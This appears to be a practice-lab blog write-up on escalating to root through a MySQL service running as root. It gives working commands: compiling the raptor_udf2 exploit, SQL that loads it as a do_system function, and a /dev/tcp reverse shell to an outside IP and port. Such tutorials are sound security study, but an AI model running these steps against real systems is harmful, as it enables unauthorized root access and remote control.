@@ -1,0 +1,84 @@
+I"i<p><img src="/assets/img/privilege-escalation/main.png" alt="Desktop View" /></p>
+
+<hr />
+
+<p><strong><span style="color:#ff5555">Introduction</span></strong></p>
+
+<hr />
+
+<p>Hey all, Hope everyone doing fine. A week ago me and my colleague started doing some practice and some R&amp;D on different techniques of Privilege Escalation. So in this blog series, I’m gonna explain some privilege escalation techniques that I did in HackTheBox, TryHackMe and other platforms.</p>
+
+<p>Privilege Escalation is important to increase your impact on target system as you will have more privileges to do more stuff and to compromise other machines or systems in that network. Basically when you get Shell or Remote Code Execution on any system, You’ll get shell as that service which you have exploited. For example, If you exploit LFI with PHP Log Poisoning or SQLi then you’ll get shell as either www-data or postgres. (in most cases but it depends on how application is configured)
+So in this case you’ll need to escalate your privileges to gain more access to system in case if you want to compromise other systems in network or install kernel/os level backdoors etc.</p>
+
+<p>Let’s start then…</p>
+
+<p><span style="color:#ff5555">This blog is meant for educational purposes only.</span></p>
+
+<hr />
+
+<p><strong><span style="color:#ff5555">Enumeration</span></strong></p>
+
+<hr />
+
+<p>The first Privilege Escalation method in this series is <strong>Service Exploits</strong> in which we are going to exploit services running as root but have access to normal user.</p>
+
+<p>In our case the service mysql is running as root. We checked this using below command.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>ps aux | grep root | grep mysql
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="/assets/img/privilege-escalation/service-exploits-1.png" alt="Desktop View" /></p>
+
+<p>In above command, We are looking at running processes with ps command and doing grep on root so that we will get processes which are running as root and then we doing grep again as mysql to see if mysql is running with root user or not.</p>
+
+<p>If mysql is running without password or if you get mysql password in any files stored on server like db.php, dbconnection.php then you can use this Privilege Escalation technique to get root.</p>
+
+<p>Let’s exploit this flaw and get root.</p>
+
+<hr />
+
+<p><strong><span style="color:#ff5555">Exploitation</span></strong></p>
+
+<hr />
+
+<p>For exploitation, We are going to use this exploit which is available on <a href="https://www.exploit-db.com/exploits/1518">ExploitDB</a>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>gcc -g -c raptor_udf2.c -fPIC
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="/assets/img/privilege-escalation/service-exploits-2.png" alt="Desktop View" /></p>
+
+<p>In above screenshot, We compiled the exploit with gcc and created shared object file, Then we logged in mysql as root user and ran below queries.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre>use mysql;
+create table foo(line blob);
+insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
+select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+create function do_system returns integer soname 'raptor_udf2.so';
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Here, On the first line we are changing our database as mysql. Then creating a new table and inserting our shared object file that we are created with gcc.
+In the next query we have dumped all data into file by giving absolute path and then we created a function as do_system to run system commands.</p>
+
+<p>After this process, We are going to use do_system function to get another reverse shell on different terminal.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>select do_system('sh&gt;&amp;/dev/tcp/10.9.65.255/1337 0&gt;&amp;1');
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="/assets/img/privilege-escalation/service-exploits-3.png" alt="Desktop View" /></p>
+
+<p>As you can see in above screenshot, We started listening for incoming connections on port 1337 using netcat on another terminal and used <strong>/dev/tcp</strong> to get reverse shell as root.</p>
+
+<p><span style="color:#ff5555"><strong>Thanks for reading this writeup and all suggestions are welcome.</strong></span></p>
+:ET
